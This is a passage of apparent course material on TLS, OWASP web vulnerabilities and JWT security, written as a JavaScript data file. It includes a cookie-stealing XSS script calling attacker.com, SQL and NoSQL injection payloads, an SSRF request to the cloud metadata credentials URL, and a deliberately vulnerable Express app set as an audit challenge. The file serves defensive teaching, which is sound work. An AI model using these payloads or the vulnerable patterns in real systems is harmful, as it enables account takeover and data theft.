SERVER HELLO:
  Selects cipher suite (TLS_AES_256_GCM_SHA384 or TLS_CHACHA20_POLY1305_SHA256)
  Sends: server key share (ECDH public key), certificate, signature

  Both sides now compute the session key using ECDH.
  ALL subsequent data encrypted with this session key.
  Total: 1 RTT (TLS 1.2 was 2 RTT)

  0-RTT "Early Data" (TLS 1.3):
  For repeat clients: can send HTTP request WITH the client hello.
  Replay attack risk — only use for idempotent GET requests.

CERTIFICATE TRANSPARENCY (CT):
  All publicly-trusted certs must be logged in public CT logs.
  Browser checks that the cert appears in a CT log.
  Protects against rogue CAs issuing certs for your domain.
  A CA issues a fake example.com cert — it appears in public logs.
  Google's Chrome will reject it if not in 2+ CT logs.

OCSP STAPLING:
  Browser needs to check if cert is revoked (not just expired).
  Classic OCSP: browser fetches revocation status from CA — leaks which sites you visit.
  OCSP Stapling: your server fetches and caches the OCSP response.
  Staples it to the TLS handshake. Client verifies without extra request.
  Must enable in nginx/Apache — not on by default.

HSTS (HTTP Strict Transport Security):
  Header: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  Browser remembers: this domain is HTTPS only.
  Prevents SSL stripping attacks (attacker downgrades connection to HTTP).
  HSTS preload: submit to browser-maintained list — loaded before first visit.

MUTUAL TLS (mTLS):
  Standard TLS: client verifies server's certificate.
  mTLS: server ALSO verifies client's certificate.
  Use case: microservice-to-microservice auth — ensures requests come from known services.
  Also: API authentication without passwords (payment networks, banking APIs).

CERTIFICATE PINNING:
  Mobile app hardcodes the expected server certificate or CA.
  Even a valid CA-signed cert from a different CA is rejected.
  Prevents MITM even if an attacker compromises a CA.
  Risk: if cert rotates without updating the app, app breaks.
  Use: pin the public key (SPKI), not the cert — survives cert renewals.`,

    code: `// NGINX TLS CONFIGURATION (production-grade) ─────────
/*
server {
    listen 443 ssl http2;
    server_name api.example.com;

    ssl_certificate     /etc/ssl/api.example.com/fullchain.pem;
    ssl_certificate_key /etc/ssl/api.example.com/privkey.pem;

    # TLS 1.3 only (TLS 1.2 still acceptable for compatibility)
    ssl_protocols TLSv1.2 TLSv1.3;

    # Secure cipher suites — exclude RC4, MD5, DES, EXPORT
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
    ssl_prefer_server_ciphers off;  # TLS 1.3 ignores this; good for 1.2

    # OCSP Stapling — cache revocation status, staple to handshake
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;

    # DH parameters for TLS 1.2 perfect forward secrecy
    ssl_dhparam /etc/ssl/dhparam4096.pem;

    # Session resumption — skip full handshake for returning clients
    ssl_session_cache   shared:SSL:10m;
    ssl_session_timeout 10m;
    ssl_session_tickets off;  # Disable — tickets have key rotation issues

    # HSTS — remember HTTPS for 2 years, all subdomains, preload list
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # Redirect HTTP to HTTPS
    location / { proxy_pass http://node_app; }
}

server {
    listen 80;
    server_name api.example.com;
    return 301 https://$server_name$request_uri;
}
*/


// NODE.JS TLS SERVER (direct — not behind nginx) ───────

const tls  = require("tls");
const fs   = require("fs");

const tlsOptions = {
  key:  fs.readFileSync("/etc/ssl/private.key"),
  cert: fs.readFileSync("/etc/ssl/cert.pem"),
  ca:   fs.readFileSync("/etc/ssl/ca.pem"),  // for mTLS client verification

  // TLS versions
  minVersion: "TLSv1.2",
  maxVersion: "TLSv1.3",

  // Cipher preference
  ciphers: [
    "TLS_AES_256_GCM_SHA384",       // TLS 1.3
    "TLS_CHACHA20_POLY1305_SHA256",  // TLS 1.3
    "ECDHE-RSA-AES256-GCM-SHA384",  // TLS 1.2 fallback
  ].join(":"),

  // For mTLS: require client certificate
  requestCert:       true,
  rejectUnauthorized: true  // reject if client cert is not signed by our CA

  // ecdhCurve: "X25519:P-256:P-384"  // supported EC curves
};

const httpsServer = require("https").createServer(tlsOptions, app);


// CERTIFICATE AUTO-RENEWAL (Let's Encrypt with Certbot) ─
/*
  # Install certbot (debian/ubuntu)
  sudo apt install certbot python3-certbot-nginx

  # Issue certificate
  sudo certbot --nginx -d api.example.com -d www.example.com

  # Auto-renewal (certbot installs systemd timer automatically)
  sudo certbot renew --dry-run   # test renewal

  # Verify OCSP stapling after renewal:
  openssl s_client -connect api.example.com:443 -status 2>/dev/null \
    | grep -A 3 "OCSP Response Status"
*/


// CERTIFICATE INSPECTION ───────────────────────────────

async function inspectCertificate(hostname, port = 443) {
  return new Promise((resolve, reject) => {
    const socket = tls.connect({ host: hostname, port, servername: hostname }, () => {
      const cert   = socket.getPeerCertificate(true); // true = full chain
      const cipher = socket.getCipher();
      const proto  = socket.getProtocol();
      socket.destroy();

      resolve({
        subject:     cert.subject,
        issuer:      cert.issuer,
        validFrom:   new Date(cert.valid_from),
        validTo:     new Date(cert.valid_to),
        daysLeft:    Math.floor((new Date(cert.valid_to) - Date.now()) / 86400000),
        fingerprint: cert.fingerprint256,
        altNames:    cert.subjectaltname,
        tlsVersion:  proto,
        cipher:      cipher.name,
        bits:        cipher.version
      });
    });
    socket.on("error", reject);
  });
}

// Health check that alerts before cert expires
async function checkCertExpiry(hostnames) {
  for (const hostname of hostnames) {
    const info = await inspectCertificate(hostname);
    if (info.daysLeft < 30) {
      logger.warn("cert_expiry_warning", {
        hostname, daysLeft: info.daysLeft, validTo: info.validTo
      });
      await slackAlert("Certificate expiring in " + info.daysLeft + " days: " + hostname);
    }
    if (info.daysLeft < 7) {
      logger.error("cert_expiry_critical", { hostname, daysLeft: info.daysLeft });
    }
  }
}


// MTLS — SERVICE-TO-SERVICE MUTUAL AUTH ───────────────

// In microservices: user-service calls order-service
// Both sides have certificates signed by our internal CA
// order-service only accepts requests from known services

class SecureMicroserviceClient {
  constructor(serviceName, targetUrl) {
    this.agent = new https.Agent({
      // Our certificate (proves we are user-service)
      key:  fs.readFileSync("/certs/" + serviceName + ".key"),
      cert: fs.readFileSync("/certs/" + serviceName + ".crt"),
      // Our CA — only trust services with certs signed by this CA
      ca:   fs.readFileSync("/certs/internal-ca.crt"),
      // Must verify the server cert
      rejectUnauthorized: true,
      keepAlive: true
    });
    this.baseUrl = targetUrl;
  }

  async get(path) {
    const res = await fetch(this.baseUrl + path, { agent: this.agent });
    if (!res.ok) throw new Error("Request failed: " + res.status);
    return res.json();
  }
}

// order-service verifies incoming client certs:
const mTLSServer = require("https").createServer({
  cert: fs.readFileSync("/certs/order-service.crt"),
  key:  fs.readFileSync("/certs/order-service.key"),
  ca:   fs.readFileSync("/certs/internal-ca.crt"),
  requestCert:        true,  // require client certificate
  rejectUnauthorized: true   // reject if not signed by internal CA
}, app);

// Middleware to extract client identity from mTLS cert
app.use((req, res, next) => {
  const cert = req.socket.getPeerCertificate();
  if (!cert || !cert.subject) return res.status(401).end("mTLS required");
  req.callerService = cert.subject.CN; // "user-service", "product-service", etc.
  next();
});`,

    bugs: `// BUG 1: Disabled certificate verification (NEVER DO THIS)

const httpsClient = require("https");

// CATASTROPHICALLY WRONG — seen in production at real companies
const badAgent = new httpsClient.Agent({
  rejectUnauthorized: false  // disables ALL certificate verification
});
// You are now vulnerable to MITM attacks.
// An attacker on the network presents a self-signed cert.
// Your code accepts it. Sends your API keys, user data, tokens.
// Attacker reads everything.
// This "fix" for a self-signed cert problem creates a worse problem.

// ACTUAL FIX: provide the CA certificate instead
const goodAgent = new httpsClient.Agent({
  ca: fs.readFileSync("/path/to/internal-ca.crt"), // trust this specific CA
  rejectUnauthorized: true  // always verify
});


// BUG 2: Weak TLS configuration exposes old vulnerabilities

// WRONG nginx config:
// ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
// TLS 1.0 and 1.1 are deprecated — they have known vulnerabilities:
// POODLE, BEAST, FREAK attacks work against TLS 1.0/1.1.
// SSL Labs will give your site an F rating.

// CORRECT:
// ssl_protocols TLSv1.2 TLSv1.3;
// This alone upgrades your SSL Labs score significantly.

// Also check: test your TLS config at ssllabs.com/ssltest
// Target: A+ rating with HSTS, no weak ciphers, OCSP stapling.


// BUG 3: Missing HSTS header — SSL stripping attack possible

app.use((req, res, next) => {
  // WRONG: Only set HSTS on HTTPS requests but no preload
  if (req.secure) {
    res.set("Strict-Transport-Security", "max-age=3600"); // too short
  }
  // This allows SSL stripping on first visit.
  // Attacker downgrades your HTTPS redirect to HTTP.
  // User's browser follows HTTP → attacker sees everything.
});

// CORRECT:
app.use((req, res, next) => {
  // Always set HSTS. 2-year max-age. All subdomains. Preload list.
  res.set(
    "Strict-Transport-Security",
    "max-age=63072000; includeSubDomains; preload"
  );
  next();
});
// After setting this correctly:
// Submit your domain to hstspreload.org
// Browsers will load HTTPS-only for your domain even on first visit.`,

    challenge: `// CHALLENGE: Build a TLS certificate monitoring and management system.

// Part 1: CertificateMonitor
//   monitor(hostnames: string[], options)
//   For each hostname:
//   - Connect and inspect certificate (without making HTTP requests)
//   - Extract: subject, issuer, validFrom, validTo, daysLeft, SANs, TLS version, cipher
//   - Check every 6 hours
//   - Alert at 30 days, critical at 7 days
//   GET /admin/certs returns current status of all monitored certs

// Part 2: TLS Configuration Auditor
//   auditTLSConfig(hostname): tests the server's TLS configuration
//   Returns:
//   {
//     grade:     "A+" | "A" | "B" | "C" | "F",
//     issues:    string[],  // "TLS 1.0 enabled", "RC4 cipher supported", etc.
//     strengths: string[],  // "TLS 1.3", "OCSP stapling", "HSTS with preload"
//   }
//   Check for: TLS version support, weak ciphers, HSTS presence and duration,
//   OCSP stapling, Certificate Transparency, certificate chain completeness.

// Part 3: Internal mTLS Certificate Manager
//   For a microservices setup with 5 services:
//   user-service, order-service, product-service, payment-service, notification-service
//
//   - generateInternalCA(): creates a self-signed CA for internal services
//   - generateServiceCert(serviceName): issues cert signed by internal CA
//   - verifyServiceCert(cert): checks if cert is signed by internal CA and not expired
//   - Middleware: requireServiceCert(allowedServices: string[])
//     Rejects requests not from listed services.

// Part 4: Explain and demonstrate certificate pinning in a mobile API client:
//   - What attack does it prevent?
//   - What is the risk of pinning the cert vs pinning the public key?
//   - How do you rotate pins without breaking existing app versions?
//   - Implement: PinnedHTTPSClient that verifies fingerprint256 matches expected value.`
  },

  {
    id: 4,
    title: "Web Security Fundamentals",
    tag: "OWASP Top 10 · Attack & Defense",
    color: "#ff5252",
    tldr: "The OWASP Top 10 is the definitive list of the most critical web security vulnerabilities. SQL injection, XSS, CSRF, SSRF, broken authentication, insecure direct object references — these are not theoretical. They are the vulnerabilities that breach real companies. Learn the attack to understand the defense.",
    why: `Security is not a feature you add at the end. Every input your API accepts is potentially malicious. Every query you run without parameterization is a SQL injection waiting to be exploited. Every HTML you render without escaping is an XSS vector. Every request your server makes to user-supplied URLs is a potential SSRF.

In India's tech market: companies that handle financial data, healthcare, or government contracts are increasingly required to pass penetration tests and security audits. Being the developer who understands OWASP and can review code for security issues is a genuine career differentiator.

The developers who get breached are not stupid — they just did not understand what they were defending against.`,

    analogy: `OWASP Top 10 as physical security failures:

1. INJECTION (SQL, NoSQL, command)
   Like telling your security guard "let in whoever says 'please'"
   Attacker adds '; DROP TABLE users; -- to your query.
   Guard (database) follows the literal instruction.

2. BROKEN AUTHENTICATION
   Like using "1234" as your safe code.
   Weak passwords, no MFA, tokens that never expire.

3. SENSITIVE DATA EXPOSURE
   Like mailing credit card numbers on postcards.
   Storing passwords in plain text. HTTP instead of HTTPS. Verbose error messages.

4. XXE (XML External Entities)
   Like an employee following instructions in ANY document they receive.
   Malicious XML makes your server fetch internal files or internal network URLs.

5. BROKEN ACCESS CONTROL (IDOR)
   Like a hotel where room 101 can see room 102's minibar items.
   GET /orders/12345 returns any user's order to any authenticated user.

6. SECURITY MISCONFIGURATION
   Like leaving the fire exit unlocked and unmonitored.
   Default credentials, directory listing on, debug mode on in production.

7. XSS (Cross-Site Scripting)
   Like letting customers write on your restaurant's menu.
   An attacker stores malicious script in your DB.
   Every visitor's browser executes it.

8. INSECURE DESERIALIZATION
   Like accepting sealed boxes from strangers and opening them inside your vault.
   Untrusted serialized data can execute arbitrary code when deserialized.

9. USING COMPONENTS WITH KNOWN VULNERABILITIES
   Like hiring a security guard who is known to be a double agent.
   npm packages with CVEs. Unpatched OS. Old Node.js version.

10. INSUFFICIENT LOGGING AND MONITORING
    Like having no security cameras and wondering how the vault was robbed.
    Attackers exploit for months before discovery.`,

    deep: `SQL INJECTION — THE MOST DESTRUCTIVE VULNERABILITY:

Vulnerable code:
  const rows = await db.query("SELECT * FROM users WHERE email = '" + email + "'");

Attacker input:
  email = "' OR '1'='1"
  Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
  Returns ALL users.

Attacker input (destructive):
  email = "'; DROP TABLE users; --"
  Query becomes: SELECT ... WHERE email = ''; DROP TABLE users; --
  Users table deleted.

Attacker input (exfiltration):
  email = "' UNION SELECT password,null,null FROM users --"
  Returns password hashes for all users.

Defense: ALWAYS parameterized queries. Never ever string concatenation.

NOSQL INJECTION (MongoDB):
Vulnerable code:
  User.findOne({ username: req.body.username, password: req.body.password })

Attacker sends JSON body:
  { "username": "admin", "password": { "$gt": "" } }
  $gt: "" matches any password (all strings are greater than empty string)
  Logs in as admin without knowing the password.

Defense: validate that password is a string, not an object. Use Mongoose schema types.

XSS — STORED vs REFLECTED:
STORED XSS: malicious script saved to DB, served to all visitors.
  Attacker posts a comment: <script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>
  Every user who views the page executes this script.
  Their session cookies are sent to the attacker.
  Attacker logs in as them.

REFLECTED XSS: malicious script in URL parameter, reflected in response.
  Link: https://site.com/search?q=<script>alert(document.cookie)</script>
  If site renders q value without escaping: script executes.
  Attacker sends this link to victims.

SSRF (Server-Side Request Forgery):
Your server fetches URLs from user input:
  POST /api/webhooks: { "callbackUrl": "http://user-provided-url.com" }

Attacker provides internal URLs:
  { "callbackUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role" }
  On AWS: this returns the EC2 instance's IAM credentials.
  Attacker now has AWS credentials.

  Or: { "callbackUrl": "http://postgres:5432" }
  Probes your internal network topology.

RATE LIMITING BYPASS:
  X-Forwarded-For: 1.2.3.4  → rotate IPs to bypass IP-based rate limiting
  Different email addresses for login attempts → bypass account lockout
  Solution: rate limit by IP AND fingerprint, require CAPTCHA after N failures.`,

    code: `// SQL INJECTION PREVENTION ───────────────────────────

// ALWAYS use parameterized queries. Never string concatenation.

class UserRepositorySecure {
  // WRONG — NEVER DO THIS
  async findByEmailBad(email) {
    return pgPool.query("SELECT * FROM users WHERE email = '" + email + "'");
    // email = "' OR '1'='1'; DROP TABLE users; --"
    // Database executes ALL of it as SQL
  }

  // RIGHT — parameterized query
  async findByEmail(email) {
    return pgPool.query("SELECT id,name,email,role FROM users WHERE email = $1", [email]);
    // $1 is a placeholder — DB driver escapes and quotes it safely
    // email value CANNOT be interpreted as SQL regardless of content
  }

  async searchUsers(query, role, limit, offset) {
    // Multiple parameters — each is numbered separately
    return pgPool.query(
      "SELECT id, name, email FROM users WHERE (name ILIKE $1 OR email ILIKE $1) AND role = $2 LIMIT $3 OFFSET $4",
      ["%" + query.replace(/%/g, "\\%") + "%", role, limit, offset]
    );
    // query.replace escapes literal % characters in search term (not for injection — for LIKE semantics)
  }
}

// MongoDB injection prevention
class MongoRepositorySecure {
  async findByCredentials(username, password) {
    // Validate types BEFORE passing to query
    if (typeof username !== "string" || typeof password !== "string") {
      throw new ValidationError("Invalid credentials format");
    }
    // Now Mongoose treats them as strings — cannot be $gt objects
    return UserModel.findOne({ username, password: await hash(password) });
  }
}


// XSS PREVENTION ──────────────────────────────────────

// 1. Content Security Policy — the most powerful XSS defense
app.use((req, res, next) => {
  res.set("Content-Security-Policy",
    "default-src 'self'; " +
    "script-src 'self' 'nonce-" + req.nonce + "'; " +  // only scripts with valid nonce
    "style-src 'self' https://fonts.googleapis.com; " +
    "img-src 'self' data: https:; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none'; " +  // no iframes (clickjacking)
    "base-uri 'self';"
  );
  next();
});

// 2. Escape all user content before rendering in HTML
// (for server-side rendered apps)
function escapeHtml(str) {
  return String(str)
    .replace(/&/g,  "&amp;")
    .replace(/</g,  "&lt;")
    .replace(/>/g,  "&gt;")
    .replace(/"/g,  "&quot;")
    .replace(/'/g,  "&#x27;")
    .replace(/\//g, "&#x2F;");
}
// With React: JSX escapes by default — only dangerouslySetInnerHTML is risky.
// In Express template engines: use {{value}} not {{{value}}} (Handlebars escapes, triple braces do not).

// 3. HTTP-only cookies — scripts cannot access session tokens
res.cookie("session_id", sessionId, {
  httpOnly: true,  // JavaScript cannot read document.cookie
  secure:   true,  // only sent over HTTPS
  sameSite: "Strict",  // not sent in cross-site requests (CSRF protection)
  maxAge:   24 * 60 * 60 * 1000
});


// CSRF PREVENTION ──────────────────────────────────────

const crypto = require("crypto");

// Double Submit Cookie pattern (stateless CSRF protection)
function generateCsrfToken() {
  return crypto.randomBytes(32).toString("hex");
}

// On login: set CSRF token in cookie AND embed in response body
app.post("/auth/login", async (req, res) => {
  const user  = await AuthService.login(req.body);
  const csrf  = generateCsrfToken();

  // Cookie: httpOnly=false so JS can read it (by design — same-origin JS only)
  res.cookie("csrf_token", csrf, { secure: true, sameSite: "Strict" });

  res.json({ user, csrfToken: csrf }); // frontend stores this, sends in header
});

// Middleware: verify CSRF on state-changing requests
function requireCsrf(req, res, next) {
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return next();

  const cookieToken  = req.cookies.csrf_token;
  const headerToken  = req.headers["x-csrf-token"];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({
      success: false,
      error: { code: "CSRF_FAILED", message: "Invalid CSRF token" }
    });
  }
  next();
}
// CSRF attack fails because: attacker's site cannot read the cookie value
// (same-origin policy) so cannot set the matching X-CSRF-Token header.


// SSRF PREVENTION ─────────────────────────────────────

const dns2  = require("dns").promises;
const ipaddr = require("ipaddr.js");

async function isSafeUrl(urlString) {
  let parsed;
  try {
    parsed = new URL(urlString);
  } catch {
    return { safe: false, reason: "Invalid URL format" };
  }

  // Only allow specific schemes
  if (!["http:", "https:"].includes(parsed.protocol)) {
    return { safe: false, reason: "Protocol not allowed: " + parsed.protocol };
  }

  // Block private hostnames
  const blockedHosts = ["localhost", "metadata.google.internal", "169.254.169.254"];
  if (blockedHosts.includes(parsed.hostname)) {
    return { safe: false, reason: "Private hostname blocked" };
  }

  // Resolve DNS and check if IP is private/loopback/link-local
  try {
    const addresses = await dns2.resolve4(parsed.hostname);
    for (const addr of addresses) {
      const ip = ipaddr.parse(addr);
      const range = ip.range();
      if (["private", "loopback", "linkLocal", "reserved"].includes(range)) {
        return { safe: false, reason: "Resolves to private IP: " + addr };
      }
    }
  } catch {
    return { safe: false, reason: "DNS resolution failed" };
  }

  return { safe: true };
}

app.post("/api/webhooks", authenticate, async (req, res, next) => {
  try {
    const { callbackUrl } = req.body;
    const check = await isSafeUrl(callbackUrl);
    if (!check.safe) {
      return res.status(400).json({
        success: false,
        error: { code: "SSRF_BLOCKED", message: "Invalid callback URL" }
        // Note: do NOT return check.reason to user — it leaks info about your network topology
      });
    }
    await WebhookService.register({ userId: req.user.id, callbackUrl });
    res.status(201).json({ success: true });
  } catch (err) { next(err); }
});


// SECURITY HEADERS MIDDLEWARE ─────────────────────────

function securityHeaders(req, res, next) {
  res.set({
    "X-Content-Type-Options":        "nosniff",            // no MIME sniffing
    "X-Frame-Options":               "DENY",               // no iframes (clickjacking)
    "X-XSS-Protection":              "1; mode=block",      // legacy XSS filter
    "Referrer-Policy":               "strict-origin-when-cross-origin",
    "Permissions-Policy":            "geolocation=(), microphone=(), camera=()",
    "Cross-Origin-Embedder-Policy":  "require-corp",
    "Cross-Origin-Opener-Policy":    "same-origin",
    "Cross-Origin-Resource-Policy":  "same-origin"
  });
  next();
}`,

    bugs: `// BUG 1: Trusting X-Forwarded-For for rate limiting

function rateLimitBad(req, res, next) {
  // X-Forwarded-For can be set by the CLIENT, not just proxies
  const ip = req.headers["x-forwarded-for"] || req.ip;
  // Attacker sends: X-Forwarded-For: 1.1.1.1
  // Each request with different fake IP bypasses your rate limiter completely
}

function rateLimitGood(req, res, next) {
  // Only trust X-Forwarded-For from your known load balancer IPs
  const trustedProxies = ["10.0.0.1", "10.0.0.2"]; // your LB IPs
  const directIp = req.socket.remoteAddress;

  let realIp = directIp;
  if (trustedProxies.includes(directIp)) {
    // Only then trust the forwarded header
    const forwarded = req.headers["x-forwarded-for"];
    if (forwarded) realIp = forwarded.split(",")[0].trim();
  }
  req.realIp = realIp;
  // Rate limit on req.realIp — cannot be spoofed without controlling the LB
}


// BUG 2: Mass assignment — accepting arbitrary object fields

app.patch("/api/users/:id", authenticate, async (req, res) => {
  // WRONG: blindly updating whatever the client sends
  await UserModel.findByIdAndUpdate(req.params.id, req.body);
  // Attacker sends: { "role": "admin", "balance": 999999, "isVerified": true }
  // All fields updated. Instant privilege escalation.
});

app.patch("/api/users/:id", authenticate, async (req, res) => {
  // RIGHT: explicit allowlist of updatable fields
  const allowed = ["name", "bio", "avatarUrl", "notificationPreferences"];
  const updates = {};
  for (const key of allowed) {
    if (req.body[key] !== undefined) updates[key] = req.body[key];
  }
  if (Object.keys(updates).length === 0) {
    return res.status(400).json({ error: "No valid fields to update" });
  }
  await UserModel.findByIdAndUpdate(req.params.id, { $set: updates });
  res.json({ success: true });
});


// BUG 3: Verbose error messages in production

app.use((err, req, res, next) => {
  // WRONG — common in Express starter code
  res.status(500).json({
    error:  err.message,  // "column 'pasword' does not exist" — reveals DB schema
    stack:  err.stack,    // full file path, line numbers, internal structure
    query:  err.query,    // the SQL query that failed — reveals schema and data structure
    config: process.env   // DO NOT EVER DO THIS but some do
  });
  // Attackers love verbose error messages — they reveal everything about your system.
});

app.use((err, req, res, next) => {
  // RIGHT: log internally, serve generic message + correlation ID
  logger.error("unhandled_error", {
    requestId: req.requestId,
    error:     err.message,
    stack:     err.stack,
    path:      req.path
  });
  res.status(err.statusCode || 500).json({
    success: false,
    error: {
      code:      "INTERNAL_ERROR",
      message:   "An unexpected error occurred",
      requestId: req.requestId  // user can quote this to support, support looks in logs
    }
  });
});`,

    challenge: `// CHALLENGE: Security audit and hardening of a vulnerable API.

// The following Express app has 8 security vulnerabilities.
// Find all 8, explain the attack for each, and provide the fixed code.

const express = require("express");
const pg      = require("pg");
const jwt     = require("jsonwebtoken");
const app     = express();
app.use(express.json());

const db = new pg.Pool({ connectionString: process.env.DATABASE_URL });

// Endpoint 1: Login
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  const result = await db.query(
    "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'"
  );
  if (!result.rows[0]) return res.status(401).json({ error: "Invalid" });
  const token = jwt.sign({ userId: result.rows[0].id }, "mysecret123", { expiresIn: "30d" });
  res.json({ token });
});

// Endpoint 2: Get any order
app.get("/orders/:id", async (req, res) => {
  const token = req.headers.authorization?.split(" ")[1];
  jwt.verify(token, "mysecret123", async (err, decoded) => {
    if (err) return res.status(401).end();
    const order = await db.query("SELECT * FROM orders WHERE id = $1", [req.params.id]);
    res.json(order.rows[0]);
  });
});

// Endpoint 3: Update user profile
app.put("/users/:id", async (req, res) => {
  const token = req.headers.authorization?.split(" ")[1];
  jwt.verify(token, "mysecret123", async (err, decoded) => {
    if (err) return res.status(401).end();
    await db.query("UPDATE users SET $1 WHERE id = $2", [req.body, req.params.id]);
    res.json({ success: true });
  });
});

// Endpoint 4: Fetch external resource
app.post("/webhook-test", async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url);
  res.json({ status: response.status, body: await response.text() });
});

// Error handler
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: err.message, stack: err.stack });
});

// TASK:
// 1. List all 8 vulnerabilities with the attack scenario for each.
// 2. Rewrite the entire file with all vulnerabilities fixed.
// 3. Add: helmet.js for security headers, express-rate-limit, input validation.
// 4. Add a security middleware layer that handles all auth in one place.`
  },

  {
    id: 5,
    title: "Authentication Security",
    tag: "JWT Attacks · Sessions · OAuth",
    color: "#ff6b35",
    tldr: "JWT is widely misunderstood and widely misimplemented. Algorithm confusion attacks, none algorithm exploits, JWT secret brute-forcing, session fixation, OAuth token theft — these are real attacks against real systems. Implementing authentication correctly requires understanding exactly how it can be broken.",
    why: `Authentication is the front door of your application. The most sophisticated backend architecture means nothing if an attacker can forge a JWT, predict session IDs, or steal OAuth tokens.

Real vulnerabilities in JWT implementations:
  - "alg: none" exploit: attacker removes signature, sets alg to none, server accepts.
  - RS256 to HS256 confusion: attacker uses your RSA public key as HMAC secret.
  - Weak JWT secrets: 7-character secrets cracked in seconds with hashcat.
  - Missing expiry: tokens valid forever — stolen token = permanent access.
  - JWT in localStorage: XSS steals the token (httpOnly cookie prevents this).

These are not hypothetical. They have been used in real breaches.`,

    analogy: `JWT ATTACKS as FORGED DOCUMENTS:

THE NONE ALGORITHM ATTACK:
  Passport has two parts: DATA + OFFICIAL STAMP.
  Normal check: verify the stamp matches the data.
  
  Attacker submits: DATA + no stamp, writes "stamp verification: none".
  Buggy verifier: "OK, it says no stamp needed — accepted."
  
  Real exploit: { "alg": "none" } in JWT header.
  Server skips signature verification. Any payload accepted.

RS256 → HS256 CONFUSION ATTACK:
  Bank uses TWO keys: PUBLIC (shared with everyone) + PRIVATE (secret).
  Documents are signed with the private key.
  Anyone verifies with the public key.
  
  Attacker: "What if I use the PUBLIC key as the HMAC secret?"
  Submits HS256 token signed with the server's public key.
  Vulnerable server: switches to HS256 mode, verifies with public key. MATCHES.
  Attacker is authenticated.

WEAK SECRET BRUTE FORCE:
  Server uses JWT_SECRET = "secret123".
  Attacker gets one valid token. Knows the algorithm.
  Runs hashcat against the token with a dictionary.
  Cracks "secret123" in 0.5 seconds.
  Can now sign ANY JWT payload with the cracked secret.

SESSION FIXATION:
  Attacker gets a session ID from the login page (before logging in).
  Tricks victim into using that session ID (phishing link).
  Victim logs in. Session is now authenticated.
  Attacker reuses the same session ID — authenticated as victim.
  Fix: always regenerate session ID on login.`,

    deep: `JWT SECURITY CHECKLIST:

1. ALGORITHM: always explicitly specify and verify the algorithm.
   jwt.verify(token, secret, { algorithms: ["HS256"] })
   Never accept the algorithm from the token header — that is attacker-controlled.

2. SECRET STRENGTH: minimum 32 random bytes (256 bits).
   crypto.randomBytes(32).toString("hex")
   "mysecret" is crackable in seconds. "password123" too.

3. EXPIRY: always set exp. Short for access tokens (15 min).
   { expiresIn: "15m" }
   Forever-valid tokens = stolen token = permanent breach.

4. KEY ROTATION: rotate JWT signing keys periodically.
   Use a kid (key ID) in the header to identify which key signed the token.
   Maintain a key store: [currentKey, previousKey].
   Gracefully handles tokens signed with previous key during rotation.

5. PAYLOAD CONTENTS: minimal. Never sensitive data.
   Only: sub (user ID), role, iat, exp.
   Never: password hash, credit card, tokens.
   Payload is base64 encoded — NOT encrypted.

6. STORAGE:
   Access token: memory (JS variable) or short-lived httpOnly cookie.
   Refresh token: httpOnly, Secure, SameSite=Strict cookie.
   NEVER: localStorage or sessionStorage (vulnerable to XSS).

OAUTH 2.0 SECURITY:
  Authorization Code with PKCE (the current standard):
  PKCE = Proof Key for Code Exchange.
  Client generates code_verifier (random), code_challenge = SHA256(code_verifier).
  Auth request sends code_challenge. Token exchange sends code_verifier.
  Authorization server verifies: SHA256(code_verifier) == code_challenge.
  Prevents authorization code interception attack.

  State parameter: prevents CSRF in OAuth flow.
  Generate random state, store in session, verify on callback.

  Token storage for SPAs:
  Access token: memory only (lost on refresh — acceptable, just re-authenticate).
  Refresh token: httpOnly cookie — XSS cannot steal it.

PASSWORD SECURITY DETAILS:
  bcrypt work factor 12: ~250ms per hash — fast enough for UX, slow enough for brute force.
  At factor 12: 1 billion password guesses = 250,000,000 seconds = 8 years per hash.
  Argon2id (preferred): memory-hard — resists GPU/ASIC brute force.
  Salt: automatically included by bcrypt/argon2 — never implement your own.
  Never: SHA-256(password) — a GPU can compute 10 billion SHA-256/second.`,

    code: `// SECURE JWT IMPLEMENTATION ──────────────────────────

const jwt    = require("jsonwebtoken");
const crypto = require("crypto");

class SecureTokenService {
  constructor(config) {
    // MUST be at least 32 bytes of random entropy
    // In production: crypto.randomBytes(32).toString("hex") stored in vault/secrets manager
    if (config.secret.length < 64) {
      throw new Error("JWT secret must be at least 64 characters of random data");
    }
    this.secret     = config.secret;
    this.algorithm  = "HS256"; // explicitly set — never read from token header
    this.accessTTL  = 15 * 60;       // 15 minutes
    this.refreshTTL = 7 * 24 * 3600; // 7 days
  }

  signAccess(payload) {
    // Minimal payload — only what is necessary
    const clean = { sub: payload.userId, role: payload.role };
    return jwt.sign(clean, this.secret, {
      algorithm: this.algorithm,
      expiresIn: this.accessTTL,
      issuer:    "api.example.com",
      audience:  "api.example.com"
    });
  }

  verify(token) {
    return jwt.verify(token, this.secret, {
      algorithms: [this.algorithm],  // CRITICAL: explicit algorithm — rejects "none" and RS256/HS256 confusion
      issuer:    "api.example.com",
      audience:  "api.example.com"
    });
    // Throws: TokenExpiredError, JsonWebTokenError, NotBeforeError
    // All result in 401 — do not distinguish to client (leaks information)
  }

  signRefresh(userId, family) {
    return jwt.sign(
      { sub: userId, type: "refresh", family, jti: crypto.randomUUID() },
      this.secret,
      { algorithm: this.algorithm, expiresIn: this.refreshTTL }
    );
    // family: UUID per login session — enables single-session logout
    // jti: unique per token — enables single-use enforcement
  }
}


// DETECT JWT BRUTE FORCE / ALGORITHM CONFUSION ────────

